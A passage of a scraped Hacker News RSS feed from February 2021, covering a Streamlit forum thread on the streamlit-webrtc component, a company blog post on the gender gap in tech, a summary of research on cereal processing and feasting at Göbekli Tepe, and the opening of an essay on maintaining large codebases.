              <meta itemprop="dateModified" content="2021-01-19T17:28:11Z">
          <span itemprop="position">#11</span>
          </span>
        </p></div>
        <p>Hey thanks for raising this, <a href="https://discuss.streamlit.io/u/whitphx">@whitphx</a> - we‚Äôre discussing this!</p>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/whitphx"><span itemprop="name">whitphx</span></a>
            
          </span></p>


          <p><span>
              <meta itemprop="datePublished" content="2021-02-02T04:33:34Z">
              <time itemprop="dateModified" datetime="2021-02-02T04:51:49Z">
                February 2, 2021,  4:51am
              </time>
          <span itemprop="position">#12</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Wow, it is working now on Sharing. Thank you, Streamlit team!<br>
<a href="https://share.streamlit.io/whitphx/streamlit-webrtc-example/main/app.py" target="_blank" rel="noopener nofollow ugc">https://share.streamlit.io/whitphx/streamlit-webrtc-example/main/app.py</a></p>
<p>The performance is much better than the sample hosted on Heroku <img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/laughing.png?v=9" title=":laughing:" alt=":laughing:"></p>
        </div>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <p>Very useful tool but is it possible to access for example rear camera of mobile phone with this library?</p>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/whitphx"><span itemprop="name">whitphx</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-02-05T10:17:17Z">
                February 5, 2021, 10:17am
              </time>
              <meta itemprop="dateModified" content="2021-02-05T10:17:17Z">
          <span itemprop="position">#14</span>
          </span>
        </p></div>
        <p>Yes, you can choose the camera with the ‚ÄúSELECT DEVICE‚Äù button.</p>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/whitphx"><span itemprop="name">whitphx</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-02-05T10:39:27Z">
                February 5, 2021, 10:39am
              </time>
              <meta itemprop="dateModified" content="2021-02-05T10:39:27Z">
          <span itemprop="position">#15</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>I wrote a tutorial about how to use this library:</p>

        </div>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <p>Is it possible to store frame by frame results through each iteration in a file like json for example?</p>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/whitphx"><span itemprop="name">whitphx</span></a>
            
          </span></p>


          </div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://discuss.streamlit.io/t/new-component-streamlit-webrtc-a-new-way-to-deal-with-real-time-media-streams/8669">https://discuss.streamlit.io/t/new-component-streamlit-webrtc-a-new-way-to-deal-with-real-time-media-streams/8669</a></em></p>]]>
            </description>
            <link>https://discuss.streamlit.io/t/new-component-streamlit-webrtc-a-new-way-to-deal-with-real-time-media-streams/8669</link>
            <guid isPermaLink="false">hacker-news-small-sites-26130494</guid>
            <pubDate>Sun, 14 Feb 2021 08:01:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Women in Tech ‚Äì Dissecting the Gender Gap]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26130348">thread link</a>) | @allending
<br/>
February 13, 2021 | https://blog.snappymob.com/women-in-tech-dissecting-the-gender-gap | <a href="https://web.archive.org/web/*/https://blog.snappymob.com/women-in-tech-dissecting-the-gender-gap">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
		<div id="primary">
			<main id="main" role="main">
<article id="post-680">
	<!-- HEADER: .header-content -->
	<!-- .header-content -->

	<!-- BODY: .entry-content -->
	<div>
		<p>The issue of gender disparities within the fields of Science, Technology,&nbsp;Engineering and Mathematics (STEM) is one that‚Äôs kept academics and feminists&nbsp;alike busy for centuries.</p>
<p>Since the emergence of such disciplines over the course of the 18th century,&nbsp;women have typically lagged behind their male counterparts in terms of&nbsp;representation; and considerable discourse has been sparked (as well as many&nbsp;the heated debate) so as to figure out <em>why.&nbsp;</em></p>

<h2><strong>The Gender-Equality Paradox in STEM&nbsp;</strong></h2>
<p>It‚Äôs certainly an interesting phenomenon to consider ‚Äî the concept that more&nbsp;progressive countries wherein you‚Äôd expect to find&nbsp;greater&nbsp;equality&nbsp;and thus an equal, if not larger, number of women working in STEM, the&nbsp;opposite is, in fact, occurring.</p>
<p>This was what was proposed by Gijsbert&nbsp;Stoet and David C. Geary, authors&nbsp;of the controversial 2018 study <a href="http://eprints.leedsbeckett.ac.uk/id/eprint/4753/6/symplectic-version.pdf" target="_blank" rel="noopener">‚ÄúThe Gender-Equality Paradox in Science, Technology, Engineering, and&nbsp;Mathematics Education‚Äù;</a>&nbsp;controversial because upon attempts by Harvard researchers to recreate the&nbsp;results produced by this study, they came up short.</p>
<p><span>In response, Stoet and Geary clarified in a </span><a href="https://journals.sagepub.com/doi/full/10.1177/0956797620904134">reply to said researchers at Harvard, published February 2020</a><span>&nbsp;that ‚Äúmen are more likely than women to enter STEM careers because of&nbsp;endogenous interest‚Äù, marking a shift from their original&nbsp;hypothesis.&nbsp;</span></p>
<p>It begs the question: Is it simply a matter of interest? That women, because&nbsp;of their more nurturing and caring tendencies, opt for occupations&nbsp;characterised by providing aid (a notable example being nursing, a primarily&nbsp;female-dominated profession worldwide), whereas men, <a href="http://pdfs.semanticscholar.org/47af/4a7e87267aba681fb6971590ec80effce0c3.pdf" target="_blank" rel="noopener">who express stronger inclinations towards working with things rather than&nbsp;people</a>, dominate careers within the fields of mathematics and engineering?</p>
<p>Or is it indeed deep-rooted in inequality and gender discrimination? Do women&nbsp;exhibit lower levels of interest in STEM degrees not simply because of innate&nbsp;predispositions, but because they are discouraged, either actively or&nbsp;subliminally, from pursuing them at a young age?</p>
<p><span>This is, arguably, where much of the debate stems from. And perhaps there&nbsp;is no right or wrong answer. Nevertheless, open discussions and constructive&nbsp;conversations with those holding differing perspectives can only serve to&nbsp;help advance existing knowledge on the issue.&nbsp;</span></p>
<h2><strong>So Why the Underrepresentation?&nbsp;</strong></h2>
<p>According to&nbsp;<a href="https://unesdoc.unesco.org/ark:/48223/pf0000253479">this text</a>&nbsp;published by the United Nations Educational, Scientific and Cultural&nbsp;Organisation (UNESCO), ‚Äúdiscrimination, biases, social norms and expectations&nbsp;that influence the quality of education women receive and the subjects they&nbsp;study‚Äù are reasons cited as to blame for gender disparity in STEM.</p>
<p>However, some may argue that it‚Äôs not patriarchal barriers keeping women out&nbsp;of STEM as the above work by UNESCO might suggest, but rather the biological&nbsp;reality that women are hard-wired differently to men, and vice versa.</p>
<p>It‚Äôs not a concept unfamiliar to many ‚Äî the psychological and behavioural&nbsp;differences between men and women has long been an area that‚Äôs generated&nbsp;substantial interest in popular culture.&nbsp;You might have even heard the&nbsp;saying ‚ÄúMen Are from Mars, Women Are from Venus‚Äù. This metaphor, coined by the&nbsp;eponymously titled book, was authored by American relationship counsellor John&nbsp;Gray, and has sold millions worldwide.</p>
<p>Although the views expressed within it are now widely considered to be&nbsp;outdated (having been&nbsp;originally published in 1992), in essence, one of&nbsp;the central points Gray highlights is this ‚Äî that women tend to think&nbsp;emotionally, whilst men tend to think logically.</p>
<p>Though many may decry this notion (as well as the book altogether),&nbsp;criticising it for stereotyping human psychology, some may also consider it&nbsp;na√Øve to believe men and women are truly wired the same ‚Äî that there do,&nbsp;indeed, exist inherent and fundamental differences in the psychology of the&nbsp;sexes.</p>
<p>And it‚Äôs this belief that lends itself to the explanation of why certain&nbsp;professions are predominantly female, whilst others remain predominately male.</p>
<p>Yet, it could be considered <em>just</em> as na√Øve to believe we live in an&nbsp;ideal world where the barriers that, for <em>centuries</em>, held women back&nbsp;from achieving equality have been completely eliminated.&nbsp;Society has&nbsp;certainly come a long way in advancing women‚Äôs rights and shedding&nbsp;stereotypical notions of gender roles, but to act like women no longer&nbsp;experience discrimination of any kind on the basis of their gender, even in&nbsp;our modern-day 21st century, may be a dire mistake.</p>
<h2><strong>The Wider Gender Gap Context</strong></h2>
<p>According to the Global Gender Gap Report, annually published by the World&nbsp;Economic Forum, the Global Gender Gap Index (GGGI) is one that measures gender&nbsp;equality through&nbsp;‚Äúbenchmark[ing] national gender gaps on economic,&nbsp;education, health and political criteria‚Äù.</p>
<p>The most recent&nbsp;<a href="http://www3.weforum.org/docs/WEF_GGGR_2020.pdf" target="_blank" rel="noopener">2020 edition of the report</a>&nbsp;ranked Malaysia as 104th amongst 153 countries overall, and 86th within the&nbsp;subindex of Educational Attainment ‚Äî one of four subindexes, with the other&nbsp;three being Economic Participation, Health and Survival and Political&nbsp;Empowerment.</p>
<p>Despite what may seem like average rankings for Malaysia, you might be pleased&nbsp;to know that though the computer industry is one typically dominated by men,&nbsp;this isn‚Äôt the case in Malaysia, where women comprise over 50% of employees&nbsp;within the field. Additionally, as of 2011, women held 49% of research&nbsp;positions in the sciences, technologies and innovations; a pretty much 50/50&nbsp;split.</p>
<h2><strong>What‚Äôs Being Done About It?</strong></h2>
<p>There exists a plethora of resources and workshops hosted by organisations,&nbsp;both globally and within Malaysia, dedicated to inspiring young women to&nbsp;pursue their passions within STEM industries.</p>
<p>One such example is&nbsp;<a href="https://women-in-tech.org/" target="_blank" rel="noopener">Women in Tech,</a> a global movement with members spanning across 100+ countries, whose&nbsp;objectives revolve around the empowerment of women with the confidence and&nbsp;skills needed to excel in STEM fields.</p>
<h2><strong>We‚Äôd Love to Hear From You</strong></h2>
<p>Here at Snappymob, we‚Äôre in the people business ‚Äî we take pride in the quality&nbsp;of our work, and stop at nothing to ensure the satisfaction of our clients.</p>
<p>That is why we believe in placing less of a focus on job titles, and more on&nbsp;providing the flexibility needed for people to find where their talents might&nbsp;best be utilised; wherever that may be.</p>
<p>Interested in being part of the team? Click <a href="https://my.wobbjobs.com/users/companies/snappymob" rel="noopener">here</a> to see our open positions or drop us an email at&nbsp;<a href="mailto:careers@snappymob.com"><span>careers@snappymob.com</span></a>!</p>
		<!-- Contact us CTA -->
		
		<!-- Post category tags-->
		<p><label>
				App Discussions			</label>
		</p>
		<!-- Social share -->
		
	</div><!-- .entry-content -->

	<!-- Disable meta footer --> 
	<!-- 	<footer class="entry-footer default-max-width">
</footer> -->
	<!-- .entry-footer -->

	<!-- Disable author detail -->
	<!-- -->
</article><!-- #post-${ID} -->
			</main><!-- #main -->
		</div><!-- #primary -->
	</div><div>
	  <div>
		
		<p>
			We understand that every project is unique. Contact us and we will get
			back to you with the next steps.
		  </p>
		
	  </div>
	</div></div>]]>
            </description>
            <link>https://blog.snappymob.com/women-in-tech-dissecting-the-gender-gap</link>
            <guid isPermaLink="false">hacker-news-small-sites-26130348</guid>
            <pubDate>Sun, 14 Feb 2021 07:16:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Day 401: But will it make money?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26129841">thread link</a>) | @curmudgeon22
<br/>
February 13, 2021 | https://roadtoramen.com/Day-401-But-will-it-make-money-2c57af92f8b34dccadc3cd5c75949fd3 | <a href="https://web.archive.org/web/*/https://roadtoramen.com/Day-401-But-will-it-make-money-2c57af92f8b34dccadc3cd5c75949fd3">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://roadtoramen.com/Day-401-But-will-it-make-money-2c57af92f8b34dccadc3cd5c75949fd3</link>
            <guid isPermaLink="false">hacker-news-small-sites-26129841</guid>
            <pubDate>Sun, 14 Feb 2021 05:02:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cereals, feasts and monuments at G√∂bekli Tepe (2019)]]>
            </title>
            <description>
<![CDATA[
Score 49 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26129693">thread link</a>) | @benbreen
<br/>
February 13, 2021 | https://www.dainst.blog/the-tepe-telegrams/2019/05/09/cereals-feasts-and-monuments-at-gobekli-tepe/ | <a href="https://web.archive.org/web/*/https://www.dainst.blog/the-tepe-telegrams/2019/05/09/cereals-feasts-and-monuments-at-gobekli-tepe/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	
		<p>We were asked in comments and messages to elaborate some more on the contents of our recent paper. So here is a short summary of the article recently published in PLoS ONE. For more information on the findings outlined here, please consult the original publication:</p>
<p><em>Dietrich L, Meister J, Dietrich O, Notroff J, Kiep J, Heeb J, et al. (2019) Cereal processing at Early Neolithic G√∂bekli Tepe, southeastern Turkey. PLoS ONE 14(5):</em> e0215214. <a href="https://doi.org/10.1371/journal.pone.0215214">https://doi.org/10.1371/journal.pone.0215214</a></p>
<p>Cereal food is one of the most important components of our modern diet. Its integration into human subsistence strategy during the late Epipalaeolithic (c. 12500‚Äì9600 cal BC) and Pre-Pottery Neolithic (PPN, c. 9600‚Äì7000 cal BC) has been recognized as a very long and complex process involving the selection and utilization of plants, strategies of exploitation of plants and land, the development of cultivation, and ways of processing, storing, and consuming plants. Widespread adoption of farming and agriculture at the end of the Pre-Pottery Neolithic (PPNB, c. 8800‚Äì7000 cal BC), the deliberate, large-scale cultivation of domesticated cereals and other plants, was predated by a longer period of experimentation and technological modification leading to the development of specialized tool kits for plant-food processing. Typical implements are e.g. pounding and grinding tools used in pairs, comprising a static low implement (mortar, grinding slab or grinding bowl) and an active upper tool that is moved across its surface (pestle or handstone).</p>
<p><strong>Cereal use in the Early Neolithic</strong><br>
The regular processing of wild cereals through grinding seems to have been established first in the Late Natufian, as suggested by macrobotanical evidence as well as by morphological changes in grinding stones combined with use-wear analyses. Flat, large grinding stones and handstones became a supra-regional standard during the Levantine PPN, constituting an integral part of the architecture. Recent investigations have highlighted the area between the upper reaches of Euphrates and Tigris as one region where the transition to food-producing subsistence took place early during the Epipalaeolithic and the Pre-Pottery Neolithic. The distribution areas of the wild forms of einkorn, emmer wheat, barley and other ‚ÄòNeolithic founder crops‚Äô overlap here and DNA fingerprinting has pinpointed the transition of two wild wheat variants to domesticated crops to this part of the Fertile Crescent. Systematic early plant use has been found at a variety of sites, like Cafer H√∂y√ºk, √áay√∂n√º, Hallan √áemi, Jerf el Ahmar or K√∂rtik Tepe.<br>
G√∂bekli Tepe has not played any role in discussions of early cereal use so far. The reasons can be found ‚Äì at least in part ‚Äì in the problematic nature of direct evidence for cereals on site. Although analysis of macrobotanical remains indicates the presence of wild einkorn (Triticum cf. boeticum/urartu), wild barley (Hordeum cf. spontaneum) and possibly wild wheat/rye (Triticum/Secale), as well as almonds (Prunus sp.) and pistachio (Pistacia sp.) at G√∂bekli Tepe, only a conspicuously low amount of carbonized plant remains has been recovered, both in handpicked and in flotation samples.</p>
<div id="attachment_7549"><p><img aria-describedby="caption-attachment-7549" loading="lazy" src="https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g007-743x1024.png" alt="journal.pone.0215214.g007" width="676" height="932" srcset="https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g007-743x1024.png 743w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g007-580x800.png 580w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g007-1306x1800.png 1306w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g007-768x1058.png 768w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g007-1115x1536.png 1115w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g007-1486x2048.png 1486w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g007-676x932.png 676w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g007.png 1650w" sizes="(max-width: 676px) 100vw, 676px"></p><p id="caption-attachment-7549">Grinding tools from G√∂bekli Tepe. (A), (C) Neolithic handstones of type 1; (B) Neolithic handstone of type 2; (D) Experimental handstone of type 1, produced as copy of (C); (E, F) Neolithic grinding bowls (German Archaeological Institute, 3D-models H. H√∂hler-Brockmann and N. Sch√§kel).</p></div>
<p>However, G√∂bekli Tepe has not only produced an impressive set of architecture ‚Äì monumental round to oval buildings with T-shaped limestone pillars, erected in an earlier phase, and smaller rectangular buildings, built around them in a partially contemporaneous and later phase ‚Äì but also a unusually large number of over 7000 grinding tools. We analyzed these tools using an integrated approach of formal, experimental, and macro- / microscopical use-wear analyses.</p>
<p><strong>G√∂bekli Tepe</strong><br>
As a first step in our analysis we had to determine the functional variation of these grinding tools, as a wide range of uses is attested archaeologically and ethnographically, ranging from cereal processing to pounding of meat or crushing of minerals. Grinding and pounding equipment from G√∂bekli Tepe was documented through 3D-modelling by structure from motion, and surfaces were macro- and microscopically analyzed for use-wear. We used replicas of the equipment identified on site to experimentally grind different materials and establish a reference collection for the identification of the observed traces. Further, phytolith samples taken from the sediments inside and outside buildings at G√∂bekli Tepe and from grinding stone surfaces allowed us to determine and quantify the presence of plants. Phytoliths were abundant in all nine soil samples examined, ranging from 0.5 to 3.0 million phytoliths per gram of sediment. Grass phytoliths were the most common group identified. The sediments inside the rectangular buildings largely contain markers for the upper and middle part of plants. This could be indicative of harvested cereals, as plants are usually collected and transported in sheaves. To contextualize the results, we assessed the spatial distribution of grinding equipment and identified potential activity areas.</p>
<p><img loading="lazy" src="https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g010.png" alt="journal.pone.0215214.g010" width="1614" height="1852" srcset="https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g010.png 1614w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g010-697x800.png 697w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g010-1569x1800.png 1569w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g010-768x881.png 768w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g010-1339x1536.png 1339w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g010-676x776.png 676w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g010-892x1024.png 892w" sizes="(max-width: 1614px) 100vw, 1614px"></p>
<p>We found that the most common types of handstones used at G√∂bekli Tepe show use-wear traces connected to cereal processing. Handstones with such traces concentrate in some of the rectangular buildings, but even more so in open spaces between and around them and the (at least partly) contemporary monumental round structures.<br>
Building D was taken as a case study to asses grinding stone use within the latter. There, grinding equipment from the deepest layer, which appears to be connected to the partially intentional refilling of the structure, also shows traces of ochre, indicating its processing in this structure.<br>
The overall quantity of 7268 analyzed grinding tools from G√∂bekli Tepe appears to be too high for simple daily use, given their relatively high productivity. A single handstone of the most common types could have produced an average of 4800 g flour within eight working hours, as our experiments show. If we assume that one person needs between 500 g and 1000 g of cereals daily as nutrients for survival, this amount would be enough to feed five to ten people.</p>
<p><strong>Interpretation</strong><br>
The organization of work and food supply has always been a central question of research into G√∂bekli Tepe, as the construction and maintenance of the monumental architecture would have necessitated a considerable work force. G√∂bekli Tepe has a high concentration of distinctive architecture, often addressed as ‚Äòspecial buildings‚Äô, which do not repeat the characteristic plans of domestic buildings from contemporaneous settlements. Extensively excavated settlement sites like Nevalƒ± √áori or √áay√∂n√º have one ‚Äòspecial building‚Äô per settlement phase, while G√∂bekli Tepe has several, likely contemporary buildings of this type, which different groups of people likely used. For the buildings excavated so far, we have observed certain regularities governing the decoration of the 69 known pillars‚Äìmostly with animal motifs, but also with abstract signs. While in building A snake images prevail, in building B foxes are dominant. In building C boar take over, and in building D the imagery is more diverse with birds, especially vultures, playing a significant role. In building H felines are of importance. We see these differences in figurative expression as evidence for different groups of people ornamenting the buildings with the emblematic animals central to their group identities. The site has also produced a wide range of stationary and portable art, far outnumbering such finds from other contemporary sites. Many of the animal and human depictions are clearly marked as male, there are almost no clearly recognizable female depictions, a situation contrary to the materials known from settlements.<br>
At the same time, G√∂bekli Tepe¬¥s remote location on a barren mountain ridge is very unusual compared to the setting of contemporaneous Neolithic settlements, which are regularly located next to water sources. The construction of monumental architecture at G√∂bekli Tepe, and other similar sites in its vicinity, would have necessitated a workforce of hundreds of people even by conservative estimates. One model to explain cooperation in small-scale communities involves ritualized work feasts. M. Dietler and E. Herbich define work feasts as events in which ‚Äúcommensal hospitality is used to orchestrate voluntary collective labour,‚Äù the incentive to work together is provided by the prospect of large amounts of food and drink. The main archaeological marker for feasting would be evidence of the presence of larger amounts of foodstuffs and tools than needed by the inhabitants of a site for their subsistence. Through our analysis, we have identified evidence for G√∂bekli Tepe that fits that pattern for plant food. As no large storage facilities have been identified, we argue for a production of food for immediate consumption and interpret these seasonal peaks in activity at the site as evidence for the organization of large work feasts. This adds to archaeozoological data suggesting large-scale hunting of migratory gazelle between midsummer and autumn.</p>
							
	</div></div>]]>
            </description>
            <link>https://www.dainst.blog/the-tepe-telegrams/2019/05/09/cereals-feasts-and-monuments-at-gobekli-tepe/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26129693</guid>
            <pubDate>Sun, 14 Feb 2021 04:29:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On navigating a large codebase]]>
            </title>
            <description>
<![CDATA[
Score 261 | Comments 125 (<a href="https://news.ycombinator.com/item?id=26129190">thread link</a>) | @mooreds
<br/>
February 13, 2021 | https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/ | <a href="https://web.archive.org/web/*/https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A while ago, I‚Äôve been working on a very large codebase that consisted of a few million lines of code.
Large systems are usually a big mess and this one was no exception.
Since this is a rather common problem in software engineering, I thought the internet would be
littered with stories about this topic.
There is a lot of talk about software carpentry, while software maintenance is rarely debated.
Either large programs are being maintained by dark matter developers or
nobody thinks that writing stories about large systems are interesting enough.</p><p>In the past I‚Äôve encountered a few of those large monsters and they seem to have a lot in common.
This article will try to present some of the problems and tricks that I am using when
I have to deal with them. Hopefully this will inspire others to write similar posts
and share tips from their own bag of tricks.</p><h2 id="large-codebase-problems">Large codebase problems</h2><p>The main problem of any large codebase is the extreme complexity that stems from the fact
that we live in a messy world of details that are very hard to describe and put into words.
The programming languages that we are using nowadays are still too primitive for that task,
and it takes a lot of lines and various layers of abstractions before we are able to convey the
rules of our world to the all mighty computer [1].</p><p>The following sections will present some of the common problems which I‚Äôve discovered during my
big system adventures.</p><p>A common trait of a large codebases is that at some point they become so large and bloated
that one person alone is no longer capable of understanding all its pieces. It seems to
me that after 100‚Äô000 lines of code, the maintenance related problems start to appear
as the complexity of the code simply dwarfs the capabilities of the human brain.
Such large systems are commonly maintained by more than one person, but with a large
group of people also come large organizational problems.</p><p>Within a large group of people the number of possible communication paths between them go bananas
and so it often happens that the ass no longer knows what the head is doing.
This misunderstanding in turn cause them to build the wrong thing that doesn‚Äôt fit
into the rest of the system. You might also know this situation under the term of
‚Äúthose people had no idea what they were doing, and we will do it right this time‚Äù which is
quite often floating around in the latest maintenance team.</p><p>That rarely happens though, because it‚Äôs likely the Towel of Babel situation all over again.</p><h3 id="loss-of-knowledge">Loss of knowledge</h3><p>Large systems are usually maintained by the ones who did not build them. Initial
developers often leave the company or move up in the pecking order to
work on other projects and are therefore no longer familiar with the system.
Sometimes the bright minds outsourced the initial development of the project
in the name of lowering the costs, just to pay tenfold in the later stages once they realize
the outsourcers developed the wrong thing. Even worse is the fact that the in house developers
didn‚Äôt gain the internal domain knowledge that is necessary for further maintenance of the system.</p><p>This presents a big problem for the new maintainers, as they can‚Äôt just go
around the company and ask the original developers about the initial design decisions.
Learning this tribal knowledge usually takes a lot of time, because the code is harder to read and
understand than it is to write. These days most developers seem to switch jobs every 2 to 3 years,
therefore the learning process has to be constantly going on, otherwise you might end up
with a large and expensive monster that nobody knows anything about [2].
For most of the past large projects on which I‚Äôve been working on, the team has usually
changed by the end of the first version.</p><p>Rigorously documenting every step is not the cure for this problem, because at some point all that
junk will become outdated and nobody will have the time to spend a year just reading the
documentation and figuring out how the pieces fit together [3].</p><h3 id="lack-of-knowledge">Lack of knowledge</h3><p>Large systems become large, because they are usually trying to solve every problem under the sun.
Often the organization that is embarking on such journey does not have enough experienced
employees on board to actually pull it off. Some like to say that pressure makes diamonds,
but sometimes it also crushes the things that are under.</p><p>It‚Äôs fine to have less experienced people working on a large system as long as they have the elders
overseeing their work. In the world where senior titles are handed left and right,
that is often not the case and it‚Äôs how you end up with a very fragile system that is suitable for
a replacement as soon as it was built. Most of the larger projects that I was working on and
were considered successes, had the core parts of the system written by experienced
developers. A significant chunks were also built by greenhorns, but they were usually
guided and their blast radius was limited to the less complex parts of the system.</p><h3 id="the-astronauts">The astronauts</h3><p>Big projects tend to attract the data modelers and other cultists who like to
get in the way of getting shit done. These architecture astronauts will endlessly
discuss the finer points of their UML data models and multithreaded layers of abstraction,
that will one day allow them to be the heroes of their own story by writing some well
encapsulated and ‚ÄúSOLID‚Äù code.</p><blockquote><p>Why IBM sales reps don‚Äôt have children?</p><p>Because all they do is sit on the bed telling their spouses how great it‚Äôs going to be.</p></blockquote><p>Meanwhile, the for loopers have to fight this creeping metadata bureaucracy
madness on a daily basis. The tools handed down to them from the ivory tower usually don‚Äôt stand
the heat of the battle, but that doesn‚Äôt bother the modelers who will try to fix
the problems with more obfuscation patterns. It‚Äôs how you end with a homebrewed middleware monstrosity,
because the 100 existing ones out there are obviously not up to the task of powering our little CRUD app.</p><h3 id="documentation-problems">Documentation problems</h3><blockquote><p>I like to keep documentation separated from the code. Who am I?</p><p>A fool, with an out of sync document.</p></blockquote><p>The documentation of any large system is almost always outdated.
The code is usually changing faster due to the endless edge cases of the system
that were not being thought of early on. The discovered edge case problems are
usually fixed by bolting additional functionality right on the spot.
The average code change of such patch is usually quite small,
but a few tweaks here and there accumulate over time until the original design no
longer matches with the reality.</p><p>Tweaking the code is usually simple as most people are familiar with the process. You pull the
code from the version control, you make your tweaks and then you push it back.
On the other hand updating the documentation is way more convoluted and usually involves the
whole ceremony, because the term documentation is actually a spaghetti of Word documents,
pdfs, spreadsheets, emails, wiki pages and some text files on some dude‚Äôs hard drive.</p><p>The corporate world still loves to use MS Word for writing technical documents, even though
it‚Äôs entirely unusable for this use case. The Word doesn‚Äôt support syntax highlighting for
code snippets and you get to play the game of ‚Äúmoving one image for 5 pixels to the
left will mess with your headings and right align all text.‚Äù
It also makes it very hard to have multiple people collaborating on the same document.
The version control still treats Word documents in the same way as binary blobs,
which makes merging changes and fixing merge conflicts far harder than it should be.
I still remember how people collaborated by working each on their own copy of the
document and having a documentation officer merging all the copies together
manually to avoid any merge conflicts. Fun times.</p><p>If you are lucky, you might be writing documentation in plain text, but then you may have to
get familiar with all kinds of weird Lovecraftian toolchains that are relying on
all sorts of ancient operating system specifics in order to produce a nicer looking document.</p><p>After all these years of progress, writing documentation is still an unpleasant process
due to all the pain surrounding the tools that we have to deal with on a daily basis.
Large projects ensure that not only is the documentation hard to write, it‚Äôs also
impossible to find and read due to the sheer number of documents [4].</p><h2 id="tackling-the-beast">Tackling the beast</h2><p>In this section I will describe my ways of tackling the problems of an unknown large codebase
that I often encounter in the wild.
As mentioned before, the main problem of large systems is that nobody can understand them
entirely and often you will be left wondering how the damn thing even works.</p><p>When you are trying to understand a specific part of a large system, it‚Äôs worth
taking the time to talk to the current maintainers. They usually know it well enough
to guide you through the jungle, so you can avoid the traps and get up to speed faster.
Sometimes you will encounter a situation where you will just have to figure it
out on your own, because nobody will have the answers to your questions.</p><p>Hopefully the following sections might give you some ideas on how to tackle such
situations.</p><h3 id="read-the-documentation">Read the documentation</h3><p>The easiest way to get familiar with a large system, is by going through its documentation and
actually reading it. Large systems usually contain
large swaths of outdated documentation, but even a slightly outdated document is
often better than not having it at all. Ask the elders about the current state of documentation,
so you don‚Äôt completely waste your time with deciphering the irrelevant documents.</p><p>Either way, the documentation will only give you an overview of the system. The details
behind design decisions are almost never mentioned and you will have to find another way.</p><h3 id="check-the-tests">Check the tests</h3><p>When I am trying to decipher how a specific part of the system is supposed to behave,
